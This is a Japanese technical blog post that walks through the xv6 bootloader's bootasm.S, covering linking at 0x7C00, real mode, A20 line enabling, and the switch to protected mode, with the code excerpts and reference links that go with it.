&lt;h3 id=&quot;bootblockoの全体像&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#bootblocko%E3%81%AE%E5%85%A8%E4%BD%93%E5%83%8F&quot; aria-label=&quot;bootblockoの全体像 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;bootblock.oの全体像&lt;/h3&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;bootasm.S&lt;/code&gt;から&lt;code class=&quot;language-text&quot;&gt;bootasm.o&lt;/code&gt;が生成され、先ほど生成した&lt;code class=&quot;language-text&quot;&gt;bootmain.o&lt;/code&gt;とリンクされて&lt;code class=&quot;language-text&quot;&gt;bootblock.o&lt;/code&gt;が生成されます。&lt;/p&gt;
&lt;p&gt;以下は&lt;code class=&quot;language-text&quot;&gt;bootasm.S&lt;/code&gt;です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;asm&quot;&gt;&lt;pre class=&quot;language-asm&quot;&gt;&lt;code class=&quot;language-asm&quot;&gt;#include &amp;quot;asm.h&amp;quot;
#include &amp;quot;memlayout.h&amp;quot;
#include &amp;quot;mmu.h&amp;quot;

# Start the first CPU: switch to 32-bit protected mode, jump into C.
# The BIOS loads this code from the first sector of the hard disk into
# memory at physical address 0x7c00 and starts executing in real mode
# with %cs=0 %ip=7c00.

.code16                       # Assemble for 16-bit mode
.globl start
start:
  cli                         # BIOS enabled interrupts; disable

  # Zero data segment registers DS, ES, and SS.
  xorw    %ax,%ax             # Set %ax to zero
  movw    %ax,%ds             # -&amp;gt; Data Segment
  movw    %ax,%es             # -&amp;gt; Extra Segment
  movw    %ax,%ss             # -&amp;gt; Stack Segment

  # Physical address line A20 is tied to zero so that the first PCs 
  # with 2 MB would run software that assumed 1 MB.  Undo that.
seta20.1:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.1

  movb    $0xd1,%al               # 0xd1 -&amp;gt; port 0x64
  outb    %al,$0x64

seta20.2:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.2

  movb    $0xdf,%al               # 0xdf -&amp;gt; port 0x60
  outb    %al,$0x60

  # Switch from real to protected mode.  Use a bootstrap GDT that makes
  # virtual addresses map directly to physical addresses so that the
  # effective memory map doesn&amp;#39;t change during the transition.
  lgdt    gdtdesc
  movl    %cr0, %eax
  orl     $CR0_PE, %eax
  movl    %eax, %cr0

//PAGEBREAK!
  # Complete the transition to 32-bit protected mode by using a long jmp
  # to reload %cs and %eip.  The segment descriptors are set up with no
  # translation, so that the mapping is still the identity mapping.
  ljmp    $(SEG_KCODE&amp;lt;&amp;lt;3), $start32

.code32  # Tell assembler to generate 32-bit code now.
start32:
  # Set up the protected-mode data segment registers
  movw    $(SEG_KDATA&amp;lt;&amp;lt;3), %ax    # Our data segment selector
  movw    %ax, %ds                # -&amp;gt; DS: Data Segment
  movw    %ax, %es                # -&amp;gt; ES: Extra Segment
  movw    %ax, %ss                # -&amp;gt; SS: Stack Segment
  movw    $0, %ax                 # Zero segments not ready for use
  movw    %ax, %fs                # -&amp;gt; FS
  movw    %ax, %gs                # -&amp;gt; GS

  # Set up the stack pointer and call into C.
  movl    $start, %esp
  call    bootmain

  # If bootmain returns (it shouldn&amp;#39;t), trigger a Bochs
  # breakpoint if running under Bochs, then loop.
  movw    $0x8a00, %ax            # 0x8a00 -&amp;gt; port 0x8a00
  movw    %ax, %dx
  outw    %ax, %dx
  movw    $0x8ae0, %ax            # 0x8ae0 -&amp;gt; port 0x8a00
  outw    %ax, %dx
spin:
  jmp     spin

# Bootstrap GDT
.p2align 2                                # force 4 byte alignment
gdt:
  SEG_NULLASM                             # null seg
  SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)   # code seg
  SEG_ASM(STA_W, 0x0, 0xffffffff)         # data seg

gdtdesc:
  .word   (gdtdesc - gdt - 1)             # sizeof(gdt) - 1
  .long   gdt                             # address gdt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;中身を見る前に、ブートプログラムのリンクについて見てみます。&lt;/p&gt;
&lt;h3 id=&quot;ブートプログラムのリンク&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%96%E3%83%BC%E3%83%88%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E3%83%AA%E3%83%B3%E3%82%AF&quot; aria-label=&quot;ブートプログラムのリンク permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ブートプログラムのリンク&lt;/h3&gt;
&lt;p&gt;リンクは以下のコマンドで実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;ld -m elf_i386 -N -e start -Ttext 0x7C00 -o bootblock.o bootasm.o bootmain.o&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ld&lt;/code&gt;コマンドは、複数のバイナリを結合し、新たな実行プログラムをコンパイルすることができるコマンドです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://kazmax.zpp.jp/cmd/l/ld.1.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ld - コマンド (プログラム) の説明 - Linux コマンド集 一覧表&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上記のコマンドでは、&lt;code class=&quot;language-text&quot;&gt;elf_i386&lt;/code&gt;バイナリとしてリンクされます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://unix.stackexchange.com/questions/471056/gnu-linker-differences-between-the-different-32bit-emulation-modes?rq=1&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;x86 - GNU Linker differences between the different 32bit emulation modes? - Unix &amp;#x26; Linux Stack Exchange&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;-N&lt;/code&gt;オプションによってtextセクションとdataセクションは読み書き可能となり、&lt;code class=&quot;language-text&quot;&gt;start&lt;/code&gt;シンボルがエントリポイントとして扱われます。&lt;/p&gt;
&lt;p&gt;また、エントリポイントの開始アドレスは&lt;code class=&quot;language-text&quot;&gt;0x7C00&lt;/code&gt;に定義されます。&lt;/p&gt;
&lt;p&gt;これは、x86CPUの場合は、起動時にBIOSのPOST(Power On Self Test)が実行された後、MBRからブートプログラムを読み込んで&lt;code class=&quot;language-text&quot;&gt;0x7C00&lt;/code&gt;に展開し、ブートセクタとします。&lt;/p&gt;
&lt;p&gt;なぜこの位置に展開されるのかについては、以下の神記事に非常に詳しく書いてありました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.glamenv-septzen.net/view/614&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Assembler/なぜx86ではMBRが”0x7C00”にロードされるのか？(完全版) - Glamenv-Septzen.net&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;簡単にまとめると、ROM BIOSの必要とする最小メモリである32KBを開けておきたいというニーズと、0x0から0x3FFまでの範囲は割込みベクタとして予約されているため、結果としてブートセクタを32KBの末尾に置くことにしたとのことです。&lt;/p&gt;
&lt;p&gt;そのため、ブートセクタの領域512Bと、MBRのbootstrap用のデータ/スタック領域として512Bを確保した結果、&lt;code class=&quot;language-text&quot;&gt;0x7C00(32KB - 1024B)&lt;/code&gt;がブートセクタの先頭アドレスになったそうです。&lt;/p&gt;
&lt;p&gt;このあたりは過去に読んだ自作OS本にはあまり詳しく書いていなかった(気がする)のでとても参考になりました。&lt;/p&gt;
&lt;p&gt;これでブートプログラムが出来上がったので、まずは中身を見ていこうと思います。&lt;/p&gt;
&lt;h3 id=&quot;リアルモードとプロテクトモード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A8%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89&quot; aria-label=&quot;リアルモードとプロテクトモード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;リアルモードとプロテクトモード&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;x86CPU&lt;/code&gt;では、起動時に&lt;code class=&quot;language-text&quot;&gt;Intel 8086&lt;/code&gt;とソフトウェア互換のある「リアルモード」で起動します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Intel 8086&lt;/code&gt;は16bitです。&lt;/p&gt;
&lt;p&gt;そのため、リアルモードは16bitで動作する状態になります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Intel_8086&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel 8086 - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここから、32bitに移行するための処理を追っていきます。&lt;/p&gt;
&lt;p&gt;リアルモードで動作する処理は以下の部分です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;#include &amp;quot;asm.h&amp;quot;
#include &amp;quot;memlayout.h&amp;quot;
#include &amp;quot;mmu.h&amp;quot;

# Start the first CPU: switch to 32-bit protected mode, jump into C.
# The BIOS loads this code from the first sector of the hard disk into
# memory at physical address 0x7c00 and starts executing in real mode
# with %cs=0 %ip=7c00.

.code16                       # Assemble for 16-bit mode
.globl start
start:
  cli                         # BIOS enabled interrupts; disable

  # Zero data segment registers DS, ES, and SS.
  xorw    %ax,%ax             # Set %ax to zero
  movw    %ax,%ds             # -&amp;gt; Data Segment
  movw    %ax,%es             # -&amp;gt; Extra Segment
  movw    %ax,%ss             # -&amp;gt; Stack Segment

  # Physical address line A20 is tied to zero so that the first PCs 
  # with 2 MB would run software that assumed 1 MB.  Undo that.
seta20.1:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.1

  movb    $0xd1,%al               # 0xd1 -&amp;gt; port 0x64
  outb    %al,$0x64

seta20.2:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.2

  movb    $0xdf,%al               # 0xdf -&amp;gt; port 0x60
  outb    %al,$0x60

  # Switch from real to protected mode.  Use a bootstrap GDT that makes
  # virtual addresses map directly to physical addresses so that the
  # effective memory map doesn&amp;#39;t change during the transition.
  lgdt    gdtdesc
  movl    %cr0, %eax
  orl     $CR0_PE, %eax
  movl    %eax, %cr0

//PAGEBREAK!
  # Complete the transition to 32-bit protected mode by using a long jmp
  # to reload %cs and %eip.  The segment descriptors are set up with no
  # translation, so that the mapping is still the identity mapping.
  ljmp    $(SEG_KCODE&amp;lt;&amp;lt;3), $start32

.code32  # Tell assembler to generate 32-bit code now.
start32:
{{ 省略 }}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;リアルモードで起動する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A7%E8%B5%B7%E5%8B%95%E3%81%99%E3%82%8B&quot; aria-label=&quot;リアルモードで起動する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;リアルモードで起動する&lt;/h3&gt;
&lt;p&gt;以下では、&lt;code class=&quot;language-text&quot;&gt;.code16&lt;/code&gt;を先頭に書くことで、コードが16bitで実行される想定となるようにアセンブラに指示をしています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;start&lt;/code&gt;セクションは、先ほどエントリポイントとしてリンクされたシンボルです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;.code16                       # Assemble for 16-bit mode
.globl start
start:
  cli                         # BIOS enabled interrupts; disable

  # Zero data segment registers DS, ES, and SS.
  xorw    %ax,%ax             # Set %ax to zero
  movw    %ax,%ds             # -&amp;gt; Data Segment
  movw    %ax,%es             # -&amp;gt; Extra Segment
  movw    %ax,%ss             # -&amp;gt; Stack Segment&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/32395542/objdump-of-code16-and-code32-x86-assembly&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Objdump of .code16 and .code32 x86 assembly - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;cliとstiでcpu割込みを禁止&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#cli%E3%81%A8sti%E3%81%A7cpu%E5%89%B2%E8%BE%BC%E3%81%BF%E3%82%92%E7%A6%81%E6%AD%A2&quot; aria-label=&quot;cliとstiでcpu割込みを禁止 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;cliとstiでCPU割込みを禁止&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cli&lt;/code&gt;は、CPUの割込みを禁止する命令です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cli&lt;/code&gt;が呼び出されてから、&lt;code class=&quot;language-text&quot;&gt;sti&lt;/code&gt;命令が呼び出されるまでの区間の処理は、CPUの割込みが禁止されます。(正確にはCPUからの割込み要求は発生するが無視される)&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://c9x.me/x86/html/file_module_x86_id_31.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;CLI : Clear Interrupt Flag (x86 Instruction Set Reference)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;これは、BIOSに設定された割込みが有効化されたままだと、ブートプログラムの処理が正しく動作しなくなるためです。&lt;/p&gt;
&lt;p&gt;そのため、ブートプログラム側でスタックポインタや割込み設定を行っている間は、割込みを無効化しておく必要があります。&lt;/p&gt;
&lt;h3 id=&quot;セグメントレジスタの初期化&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%BB%E3%82%B0%E3%83%A1%E3%83%B3%E3%83%88%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96&quot; aria-label=&quot;セグメントレジスタの初期化 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;セグメントレジスタの初期化&lt;/h3&gt;
&lt;p&gt;次の4行では、AXレジスタ、DSレジスタ、ESレジスタ、SSレジスタをそれぞれ&lt;code class=&quot;language-text&quot;&gt;0x0000&lt;/code&gt;に初期化しています。&lt;/p&gt;
&lt;p&gt;AXレジスタはアキュムレータですが、他の3つのレジスタはセグメントレジスタです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Intel_8086&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel 8086 - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://qiita.com/timwata/items/e7b7a18cc80b31fd940a&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel 8086 CPU 基礎 - Qiita&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここでは、BIOSに設定されたセグメントレジスタの値を初期化しています。&lt;/p&gt;
&lt;p&gt;一応各セグメントレジスタの用途について簡単に書いておきます。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;レジスタ&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;用途&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;DSレジスタ&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;データ用のデフォルトセグメントレジスタ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;ESレジスタ&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;データ用のセグメントレジスタ&lt;br /&gt;通常はDSレジスタを使用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;SSレジスタ&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;スタック用のセグメントレジスタで、SPやBPによるメモリ参照時に使用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;CSレジスタ&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;コード用のセグメントレジスタ&lt;br /&gt;命令ポインタ(IP)はCSレジスタを使用&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://www.tamasoft.co.jp/lasm/help/lasm1to2.htm&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;8086 のレジスタ&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;a20-lineの有効化&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#a20-line%E3%81%AE%E6%9C%89%E5%8A%B9%E5%8C%96&quot; aria-label=&quot;a20 lineの有効化 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;A20 Lineの有効化&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Intel 8086&lt;/code&gt;では、後方互換のためにデフォルトでA20 Line(メモリアクセスの21番目のbit)が無効化されています。&lt;/p&gt;
&lt;p&gt;そのため、最大2MBのメモリ領域にアクセスするためには、A20 Lineを有効化する必要があります。&lt;/p&gt;
&lt;p&gt;A20 Lineは初めはKBC(キーボードコントローラ)に接続されています。&lt;/p&gt;
&lt;p&gt;KBCとは、キーボードからの入力をCPUに伝えるための機構です。&lt;/p&gt;
&lt;p&gt;KBCは、キーボードからシリアル通信で受け取った情報を一度バッファに格納し、KBCの制御コマンドか、CPUに転送する入力データかをチェックします。&lt;/p&gt;
&lt;p&gt;CPUに転送するデータの場合は&lt;code class=&quot;language-text&quot;&gt;0x60&lt;/code&gt;、制御コマンドの場合は&lt;code class=&quot;language-text&quot;&gt;0x64&lt;/code&gt;のポートからデータが転送されます。&lt;/p&gt;
&lt;p&gt;ここで、以下のコードではそれぞれ、KBCのバッファに未処理の入力がない状態を確認してから、&lt;code class=&quot;language-text&quot;&gt;0x60&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;0x64&lt;/code&gt;のポートにそれぞれ制御コマンドを送信することで、A20を有効化します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;  # Physical address line A20 is tied to zero so that the first PCs 
  # with 2 MB would run software that assumed 1 MB.  Undo that.
seta20.1:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.1

  movb    $0xd1,%al               # 0xd1 -&amp;gt; port 0x64
  outb    %al,$0x64

seta20.2:
  inb     $0x64,%al               # Wait for not busy
  testb   $0x2,%al
  jnz     seta20.2

  movb    $0xdf,%al               # 0xdf -&amp;gt; port 0x60
  outb    %al,$0x60&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記の例では、制御コマンド&lt;code class=&quot;language-text&quot;&gt;0xd1&lt;/code&gt;をポート&lt;code class=&quot;language-text&quot;&gt;0x64&lt;/code&gt;に送信した後、&lt;code class=&quot;language-text&quot;&gt;0xdf&lt;/code&gt;がポート&lt;code class=&quot;language-text&quot;&gt;0x60&lt;/code&gt;に送信され、A20が有効になります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/A20_Line&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;A20 Line - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://cstmize.hatenablog.jp/entry/2019/06/11/A20_gate%E3%81%A8keyboard_controller%E3%81%A8%E3%81%AE%E3%82%84%E3%82%8A%E3%81%A8%E3%82%8A%28xv6%E3%82%92%E4%BE%8B%E3%81%AB%E3%81%97%E3%81%A6%29&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;A20 gateとkeyboard controller(xv6を例にして) - 私のひらめき日記&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/15768683/the-a20-line-with-jos&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;assembly - The A20 Line with JOS - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;プロテクトモードへの移行&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89%E3%81%B8%E3%81%AE%E7%A7%BB%E8%A1%8C&quot; aria-label=&quot;プロテクトモードへの移行 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロテクトモードへの移行&lt;/h3&gt;
&lt;p&gt;ここからプログラムの操作はプロテクトモードに移行します。&lt;/p&gt;
&lt;p&gt;プロテクトモードは「保護」リアルモードとは異なり、メモリ空間が保護されます。&lt;/p&gt;
&lt;p&gt;つまり、プロテクトモードではプログラムは許可されたメモリ空間にのみアクセスすることが可能となります。&lt;/p&gt;
&lt;p&gt;このため、リアルモードからプロテクトモードに移行する際には、ロードするカーネルがアクセス可能なメモリ空間を事前に定義する必要があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;  # Switch from real to protected mode.  Use a bootstrap GDT that makes
  # virtual addresses map directly to physical addresses so that the
  # effective memory map doesn&amp;#39;t change during the transition.
  lgdt    gdtdesc
  movl    %cr0, %eax
  orl     $CR0_PE, %eax
  movl    %eax, %cr0

//PAGEBREAK!
  # Complete the transition to 32-bit protected mode by using a long jmp
  # to reload %cs and %eip.  The segment descriptors are set up with no
  # translation, so that the mapping is still the identity mapping.
  ljmp    $(SEG_KCODE&amp;lt;&amp;lt;3), $start32
